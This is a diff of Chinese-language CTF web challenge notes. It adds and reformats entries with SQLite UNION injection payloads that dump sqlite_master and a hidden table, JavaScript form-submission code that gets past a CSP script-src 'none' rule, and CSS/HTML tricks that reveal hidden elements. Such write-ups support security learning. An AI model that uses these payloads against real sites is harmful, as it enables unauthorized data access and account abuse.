@@ -997,6 +997,51 @@ $('#ajax-load').load('/ajax/articles?cat=news');
 - 此题可以上传任意名字的任意文件，且文件名经过拼接存储。那么就可以上传`../app.py`覆盖原本flask的app.py，使其返回flag。
 169. [Brawl: Shopping Spree](https://deyixtan.github.io/posts/wxmctf2023/web4-brawl-shopping-spree/)
 - sqlite union联合注入（要注入的表名已知）。
-> 测试语句：`' UNION SELECT 1,2,3,4,5 FROM skins WHERE '1' = '1`。
-> 从sqlite_master表中找出指定表的结构：`' UNION SELECT sql,1,1,1,1 FROM sqlite_master WHERE name='secretskins`(表名secretskins需要已知)
-> 查询出值：`' UNION SELECT skinid,description,image,1,1 as name FROM secretskins WHERE '1' = '1`.
+  - > 测试语句：`' UNION SELECT 1,2,3,4,5 FROM skins WHERE '1' = '1`。
+  - > 从sqlite_master表中找出指定表的结构：`' UNION SELECT sql,1,1,1,1 FROM sqlite_master WHERE name='secretskins`(表名secretskins需要已知)
+  - > 查询出值：`' UNION SELECT skinid,description,image,1,1 as name FROM secretskins WHERE '1' = '1`.
+170. [OURspace](https://deyixtan.github.io/posts/wxmctf2023/web5-ourspace/)
+- 使用js代码创建form绕过CSP `script-src 'none'`执行xss
+```js
+const form = document.createElement("form");
+const username = document.createElement("input");
+const password = document.createElement("input");
+username.name = "username";
+username.value = "1";
+password.name = "password";
+password.value = "1";
+form.method = "POST"
+form.action = "http://127.0.0.1:3000/login";
+form.appendChild(username);
+form.appendChild(password);
+document.getElementsByTagName("body")[0].appendChild(form);
+form.submit();
+//或者
+javascript:{
+var form = document.createElement("form");
+form.method = "POST";
+form.action = "http://127.0.0.1:3000/login";
+var element1 = document.createElement("input"); 
+var element2 = document.createElement("input");  
+element1.value="123456";
+element1.name="username";
+form.appendChild(element1);  
+element2.value="123456";
+element2.name="password";
+form.appendChild(element2);
+document.body.appendChild(form);
+form.submit();
+}
+```
+-  绕过`<p style="display: none;">`标签，使标签内的内容显现出来。此题由于会在p标签前直接插入用户可控制内容，导致可以构造另一个未闭合的标签p(`<p name="`)来吞掉目标标签p的`display: none;`属性。或是设置style标签：
+```html
+<style>
+p {
+display: inline !important; /* https://developer.mozilla.org/en-US/docs/Web/CSS/important */
+margin-top: -24rem;
+position: absolute;
+}
+</style>
+```
+
+`!important`的优先级比`display: none;`高，高亮标签内的内容。
